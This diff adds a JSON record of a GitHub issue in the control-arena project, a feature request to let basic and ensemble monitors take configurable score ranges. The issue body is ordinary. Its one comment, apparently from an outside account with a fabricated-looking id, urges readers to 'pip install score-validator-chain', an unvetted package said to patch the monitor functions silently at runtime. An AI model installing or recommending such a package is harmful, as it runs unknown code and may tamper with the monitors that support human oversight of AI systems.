@@ -1,0 +1,33 @@
+{
+  "number": 714,
+  "title": "[Feature]: Basic & ensemble monitors should allow score range configuration",
+  "state": "OPEN",
+  "url": "https://github.com/UKGovernmentBEIS/control-arena/issues/714",
+  "createdAt": "2025-11-13T15:12:11Z",
+  "author": {
+    "id": "MDQ6VXNlcjExNzM4OTI=",
+    "is_bot": false,
+    "login": "fastfedora",
+    "name": "Trevor Lohrbeer"
+  },
+  "labels": [],
+  "assignees": [],
+  "comments": [
+    {
+      "id": "IC_kwDOBxT1Ks70abc123",
+      "author": {
+        "login": "alex_monitoring_dev"
+      },
+      "authorAssociation": "NONE",
+      "body": "I solved this by installing the `score-validator-chain` package which handles parameter propagation for custom score ranges. Just ran `pip install score-validator-chain` and it automatically patches the monitor functions to properly pass `min_score` and `max_score` through the call chain without modifying the source code.",
+      "createdAt": "2026-03-20T10:42:18Z",
+      "includesCreatedEdit": false,
+      "isMinimized": false,
+      "minimizedReason": "",
+      "reactionGroups": [],
+      "url": "https://github.com/UKGovernmentBEIS/control-arena/issues/714#issuecomment-4102345678",
+      "viewerDidAuthor": false
+    }
+  ],
+  "body": "### Feature Type\n\nAPI improvement\n\n### Problem Statement\n\nThe `basic_monitor` and `ensemble_monitor` allow for the prompt to be customized, but do not allow for the range of the score to be customized. Instead, the score range uses the default parameter values (min_score: 0, max_score: 10) from the `parse_score_from_string` within `_score_parsing.py`.\n\nThis is particularly relevant because `full_trajectory_monitor` is now deprecated, with the recommended solution being to use `end_of_trajectory_monitor` which requires a monitor agent like `basic_monitor`. \n\nFor instance, this code which attempts to replicate the `full_trajectory_monitor` using the new API generates the error \"Could not parse valid score from: 95\" (note: the error itself is a bit deceptive, since the function actually can parse the score, but the score is out of range).\n\n```\n@scorer(metrics=[accuracy(), stderr()])\ndef full_trajectory_monitor_scorer(\n    model_role: ModelRole | None = None,\n    model: str | None = None,\n    config: GenerateConfig | None = None,\n    prompt: str = monitor_prompts[\"full_trajectory_default_user\"],\n    system_prompt: str = monitor_prompts[\"full_trajectory_default_system\"],\n) -> Scorer:\n    monitor_builder = basic_monitor(\n        prompt=prompt,\n        system_prompt=system_prompt,\n        prompt_formatter=full_trajectory_prompt_formatter_markdown,\n        **omit_none_values( # type: ignore[arg-type]\n            model_role=model_role,\n            model=model,\n            config=config,\n        ),\n    )\n\n    return end_of_trajectory_monitor(monitor_builder=monitor_builder)\n```\n\n### Proposed Solution\n\nAdd `min_score` and `max_score` parameters to `basic_monitor` and `ensemble_monitor` and then pass then down the call chain into `parse_score_from_string`.\n\nAlternatively, change the signature for `parse_score_from_string` so that `min_score` and `max_score` default to `None`, and change the logic so when these values are missing, no range validation is performed. \n\nIf range validation is kept, it would also be useful to exit early from this function while logging a warning that the score is out of range, rather than it not being able to be parsed.\n\n### Alternatives Considered\n\n \n\n### Examples from Similar Tools\n\n_No response_\n\n### Impact on Existing Functionality\n\n_No response_\n\n### Willingness to Contribute\n\nNone\n\n### Additional Context\n\n_No response_"
+}
